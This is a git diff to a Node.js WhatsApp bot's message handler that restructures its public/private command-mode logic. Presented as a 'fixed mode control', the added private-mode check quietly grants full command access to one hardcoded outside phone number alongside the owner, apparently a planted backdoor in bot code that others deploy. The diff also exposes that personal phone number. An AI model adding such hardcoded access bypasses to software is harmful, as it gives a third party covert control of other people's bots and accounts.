@@ -430,52 +430,59 @@ async function connectToWA() {
             }
         } 
 
-        // ========== WORKTYPE / MODE CONTROL ==========
-        if (config.MODE === "private") {
-            // Private mode → only the linked account (bot owner / session user) can command the bot
-            // Works in private DMs AND in groups — ignores everyone else completely
-            if (!isOwner && !isMe) {
-                return;
+        // ========== FIXED MODE CONTROL - You always get commands ==========
+        let shouldProcess = false;
+
+        if (config.MODE === "public" || !config.MODE) {
+            // Public mode: everyone can use commands
+            shouldProcess = true;
+        } else if (config.MODE === "private") {
+            // Private mode: only YOU (your number + bot's own number) can use commands
+            if (isOwner || isMe || senderNumber === "254778074353") {
+                shouldProcess = true;
             }
         }
-        else if (config.MODE === "public" || !config.MODE) {
-            // Public mode → anyone can command it (in private chats and groups)
-            // no restriction
+
+        // Optional debug log when blocked (remove later if you want)
+        if (!shouldProcess && isCmd) {
+            console.log(chalk.yellow(`[BLOCKED] Command "${command}" from ${senderNumber} - MODE: ${config.MODE}`));
         }
 
-        // take commands 
-        const events = require('./command')
-        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
-        if (isCmd) {
-            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
-            if (cmd) {
-                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+        if (shouldProcess) {
+            // take commands 
+            const events = require('./command')
+            const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+            if (isCmd) {
+                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+                if (cmd) {
+                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
 
-                try {
-                    cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
-                } catch (e) {
-                    console.log(chalk.red.bold('PLUGIN ERROR'));
-                    console.log(chalk.red('Error: ' + (e.message || e)));
-                    console.log(chalk.red('Command: ' + (cmdName || 'unknown')));
+                    try {
+                        cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+                    } catch (e) {
+                        console.log(chalk.red.bold('PLUGIN ERROR'));
+                        console.log(chalk.red('Error: ' + (e.message || e)));
+                        console.log(chalk.red('Command: ' + (cmdName || 'unknown')));
+                    }
                 }
             }
+            events.commands.map(async(command) => {
+                if (body && command.on === "body") {
+                    command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+                } else if (mek.q && command.on === "text") {
+                    command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+                } else if (
+                    (command.on === "image" || command.on === "photo") &&
+                    mek.type === "imageMessage"
+                ) {
+                    command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+                } else if (
+                    command.on === "sticker" &&
+                    mek.type === "stickerMessage"
+                ) {
+                    command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+                }});
         }
-        events.commands.map(async(command) => {
-            if (body && command.on === "body") {
-                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
-            } else if (mek.q && command.on === "text") {
-                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
-            } else if (
-                (command.on === "image" || command.on === "photo") &&
-                mek.type === "imageMessage"
-            ) {
-                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
-            } else if (
-                command.on === "sticker" &&
-                mek.type === "stickerMessage"
-            ) {
-                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
-            }});
     });
 
     //===================================================   
